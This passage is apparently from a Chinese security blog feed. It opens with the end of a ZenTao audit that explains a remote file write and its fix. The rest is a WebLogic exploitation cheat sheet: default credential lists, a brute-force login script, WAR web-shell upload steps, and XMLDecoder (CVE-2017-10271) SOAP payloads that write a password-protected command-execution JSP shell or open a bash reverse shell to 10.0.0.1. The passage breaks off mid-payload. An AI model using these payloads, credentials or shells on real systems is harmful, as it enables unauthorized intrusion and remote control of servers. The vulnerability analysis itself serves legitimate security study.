class="line">2</span></pre></td><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        set_time_limit(0);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        $result &#x3D; $this-&gt;client-&gt;downloadZipPackage($version, $link);&#x2F;&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">        if($result &#x3D;&#x3D; false) $this-&gt;send(array(&#39;result&#39; &#x3D;&gt; &#39;fail&#39;, &#39;message&#39; &#x3D;&gt; $this-&gt;lang-&gt;client-&gt;downloadFail));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">        $client &#x3D; $this-&gt;client-&gt;edit($version, $result, $os);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        if($client &#x3D;&#x3D; false) $this-&gt;send(array(&#39;result&#39; &#x3D;&gt; &#39;fail&#39;, &#39;message&#39; &#x3D;&gt; $this-&gt;lang-&gt;client-&gt;saveClientError));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        $this-&gt;send(array(&#39;result&#39; &#x3D;&gt; &#39;success&#39;, &#39;client&#39; &#x3D;&gt; $client, &#39;message&#39; &#x3D;&gt; $this-&gt;lang-&gt;saveSuccess, &#39;locate&#39; &#x3D;&gt; inlink(&#39;browse&#39;)));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure><p>将传入的参数<code>version，link</code>带入了extclientModel类的 <code>downloadZipPackage</code>方法中，跟进</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function downloadZipPackage($version, $link)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    $decodeLink &#x3D; helper::safe64Decode($link);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    if(preg_match(&#39;&#x2F;^https?\:\&#x2F;\&#x2F;&#x2F;&#39;, $decodeLink)) return false;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    return parent::downloadZipPackage($version, $link);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure><p>看出，先将 <code>$link</code>参数base64解码，此处正好绕过了前面的参数检测。接着检测不能为<code>http/https</code>协议，接着调用父类的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function downloadZipPackage($version, $link)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        ignore_user_abort(true);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        set_time_limit(0);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">        if(empty($version) || empty($link)) return false;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">        $dir  &#x3D; &quot;data&#x2F;client&#x2F;&quot; . $version . &#39;&#x2F;&#39;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">        $link &#x3D; helper::safe64Decode($link);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        $file &#x3D; basename($link);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        if(!is_dir($this-&gt;app-&gt;wwwRoot . $dir))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">            mkdir($this-&gt;app-&gt;wwwRoot . $dir, 0755, true);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">        if(!is_dir($this-&gt;app-&gt;wwwRoot . $dir)) return false;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">        if(file_exists($this-&gt;app-&gt;wwwRoot . $dir . $file))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">            return commonModel::getSysURL() . $this-&gt;config-&gt;webRoot . $dir . $file;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">        ob_clean();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">        ob_end_flush();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">        $local  &#x3D; fopen($this-&gt;app-&gt;wwwRoot . $dir . $file, &#39;w&#39;);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">        $remote &#x3D; fopen($link, &#39;rb&#39;);   &#x2F;&#x2F;读取远程文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">        if($remote &#x3D;&#x3D;&#x3D; false) return false;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">        while(!feof($remote))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">        &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">            $buffer &#x3D; fread($remote, 4096);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">            fwrite($local, $buffer);&#x2F;&#x2F;写入本地文件</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">        fclose($local);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">        fclose($remote);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">        return commonModel::getSysURL() . $this-&gt;config-&gt;webRoot . $dir . $file;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr></table></figure><p>最终，将读取的远程文件写入到本地的  www目录下的 <code>/data/client/$version/</code>中，文件名不变。</p><p>由于client模块不在上面分析的公开的模块中，因此需要登录。</p><p>最终可以构造link写入到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?m&#x3D;client&amp;f&#x3D;download&amp;version&#x3D;1&amp;link&#x3D;bs64encode(ftp:&#x2F;&#x2F;x.x.x.x&#x2F;x.php)&amp;os&#x3D;win</span></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;client-download-1-bs64encode(ftp:&#x2F;&#x2F;x.x.x.x&#x2F;x.php)-win.html</span></pre></td></tr></table></figure><p>远程文件会写到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;data&#x2F;client&#x2F;1&#x2F;x.php</span></pre></td></tr></table></figure><p>除了ftp协议，还可使用 <code>file</code>协议。</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>官方在12.4.3中修复了</p><p>在 client.php 文件中的  <code>extclientModel</code>方法中添加了文件后缀白名单检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">public function downloadZipPackage($version, $link)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    $decodeLink &#x3D; helper::safe64Decode($link);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    if(!preg_match(&#39;&#x2F;^https?\:\&#x2F;\&#x2F;&#x2F;&#39;, $decodeLink)) return false;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;++++add</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    $file      &#x3D; basename($link);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    $extension &#x3D; substr($file, strrpos($file, &#39;.&#39;) + 1);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    if(strpos(&quot;,&#123;$this-&gt;config-&gt;file-&gt;allowed&#125;,&quot;, &quot;,&#123;$extension&#125;,&quot;) &#x3D;&#x3D;&#x3D; false) return false;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    return parent::downloadZipPackage($version, $link);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure><p>在解码后，检测了文件后缀是否为配置文件的白名单。</p>]]></content>
    
    <summary type="html">
    
      禅道后台文件上传分析代码漏洞成因分析以及修复方式
    
    </summary>
    
    
      <category term="代码审计" scheme="http://h3art3ars.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="http://h3art3ars.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="禅道" scheme="http://h3art3ars.github.io/tags/%E7%A6%85%E9%81%93/"/>
    
      <category term="文件上传" scheme="http://h3art3ars.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>weblogic漏洞总结</title>
    <link href="http://h3art3ars.github.io/2020/09/23/weblogic%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>http://h3art3ars.github.io/2020/09/23/weblogic%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2020-09-23T08:25:51.000Z</published>
    <updated>2020-09-23T08:30:19.642Z</updated>
    
    <content type="html"><![CDATA[<h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">weblogic:weblogic</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">weblogic:weblogic123</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">weblogic:Oracle@123</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">system:password</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">admin:security</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">joe:password</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">mary:password</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">system:security</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">wlcsystem:wlcsystem</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">wlpisystem</span></pre></td></tr></table></figure><h2 id="登录界面"><a href="#登录界面" class="headerlink" title="登录界面"></a>登录界面</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;console&#x2F;login&#x2F;LoginForm.jsp</span></pre></td></tr></table></figure><h2 id="爆破脚本"><a href="#爆破脚本" class="headerlink" title="爆破脚本"></a>爆破脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">import requests</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">import sys</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">def weakPasswd(url):</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    &quot;&quot;&quot;weak password&quot;&quot;&quot;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    pwddict &#x3D; [&#39;Weblogic&#39;, &#39;weblogic&#39;, &#39;weblogic123&#39;, &#39;Oracle@123&#39;, &#39;password&#39;, &#39;system&#39;, &#39;Administrator&#39;, &#39;admin&#39;,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">               &#39;security&#39;, &#39;joe&#39;, &#39;mary&#39;, &#39;wlcsystem&#39;, &#39;wlpisystem&#39;]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    for user in pwddict:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        for pwd in pwddict:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">            data &#x3D; &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">                &#39;j_username&#39;: user,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">                &#39;j_password&#39;: pwd,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">                &#39;j_character_encoding&#39;: &#39;UTF-8&#39;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">            &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">            req &#x3D; requests.post(url + &#39;&#x2F;console&#x2F;j_security_check&#39;, data&#x3D;data, allow_redirects&#x3D;False,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">                                verify&#x3D;False)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">            if req.status_code &#x3D;&#x3D; 302 and &#39;console&#39; in req.text and &#39;LoginForm.jsp&#39; not in req.text:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">                print(&#39;[+] WebLogic  username: &#39; + user + &#39;  password: &#39; + pwd)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">                return True</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">    return False</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    if len(sys.argv)!&#x3D;2 or sys.argv[1]&#x3D;&#x3D;&quot;-h&quot;:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">        print(&quot;python3 test.py http:&#x2F;&#x2F;ip:port&quot;)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">        exit()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">    weakPasswd(sys.argv[1])</span></pre></td></tr></table></figure><p>进图管理员页面</p><p>部署-&gt;安装-&gt;上载文件-&gt;制作war包-&gt;上传-&gt;一直下一步-&gt;完成-&gt;保存</p><p>shell地址 <a href="http://ip/filename/filename.jsp" target="_blank" rel="noopener">http://ip/filename/filename.jsp</a></p><h1 id="WebLogic-XMLDecoder反序列化漏洞-CVE-2017-3506-CVE-2017-10271"><a href="#WebLogic-XMLDecoder反序列化漏洞-CVE-2017-3506-CVE-2017-10271" class="headerlink" title="WebLogic  XMLDecoder反序列化漏洞( CVE-2017-3506 ,CVE-2017-10271)"></a>WebLogic  XMLDecoder反序列化漏洞( CVE-2017-3506 ,CVE-2017-10271)</h1><h2 id="version"><a href="#version" class="headerlink" title="version"></a>version</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">10.3.6.0.0,</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">12.1.3.0.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">12.2.1.1.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">12.2.1.2.0</span></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>漏洞页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&#x2F;wls-wsat&#x2F;CoordinatorPortType</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&#x2F;wls-wsat&#x2F;CoordinatorPortType11</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&#x2F;wls-wsat&#x2F;ParticipantPortType</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&#x2F;wls-wsat&#x2F;ParticipantPortType11</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">&#x2F;wls-wsat&#x2F;RegistrationPortTypeRPC11</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&#x2F;wls-wsat&#x2F;RegistrationRequesterPortType11</span></pre></td></tr></table></figure><p>向此页面post 以下，<code>Content-Type</code>一定要设置为 <code>text/xml</code> 利用成功返回 <code>500</code></p><p>之后访问poc内的文件路径。例如 ：<code>bea_wls_internal/test.jsp</code></p><h2 id="探测poc"><a href="#探测poc" class="headerlink" title="探测poc"></a>探测poc</h2><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">    &lt;soapenv:Header&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">    &lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">    &lt;java&gt;&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">    &lt;object class&#x3D;&quot;java.io.PrintWriter&quot;&gt; </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">    &lt;string&gt;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war&#x2F;test.jsp&lt;&#x2F;string&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">    &lt;void method&#x3D;&quot;println&quot;&gt;&lt;string&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    &lt;![CDATA[</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&lt;% out.print(&quot;CVE-2017-10271&quot;); %&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    ]]&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    &lt;&#x2F;string&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    &lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">    &lt;void method&#x3D;&quot;close&quot;&#x2F;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    &lt;&#x2F;object&gt;&lt;&#x2F;java&gt;&lt;&#x2F;java&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">    &lt;&#x2F;work:WorkContext&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">    &lt;&#x2F;soapenv:Header&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">    &lt;soapenv:Body&#x2F;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;soapenv:Envelope&gt;</span></pre></td></tr></table></figure><p>命令执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt;&lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;&lt;java&gt;&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;&lt;object class&#x3D;&quot;java.io.PrintWriter&quot;&gt; &lt;string&gt;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war&#x2F;test.jsp&lt;&#x2F;string&gt;&lt;void method&#x3D;&quot;println&quot;&gt;&lt;string&gt;&lt;![CDATA[&lt;%   if(&quot;h3art3ars&quot;.equals(request.getParameter(&quot;password&quot;)))&#123;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;command&quot;)).getInputStream();  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">        int a &#x3D; -1;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">        byte[] b &#x3D; new byte[2048];  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">            out.println(new String(b));  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">        &#125;  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);  </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">    &#125; %&gt;]]&gt;&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;&lt;void method&#x3D;&quot;close&quot;&#x2F;&gt;&lt;&#x2F;object&gt;&lt;&#x2F;java&gt;&lt;&#x2F;java&gt;&lt;&#x2F;work:WorkContext&gt;&lt;&#x2F;soapenv:Header&gt;&lt;soapenv:Body&#x2F;&gt;&lt;&#x2F;soapenv:Envelope&gt;</span></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">bea_wls_internal&#x2F;test.jsp?password&#x3D;h3art3ars&amp;command&#x3D;whoami</span></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt; &lt;soapenv:Header&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">&lt;void index&#x3D;&quot;0&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&lt;void index&#x3D;&quot;1&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&lt;string&gt;-c&lt;&#x2F;string&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;void&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">&lt;void index&#x3D;&quot;2&quot;&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">&lt;string&gt;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;21 0&gt;&amp;1&lt;&#x2F;string&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span 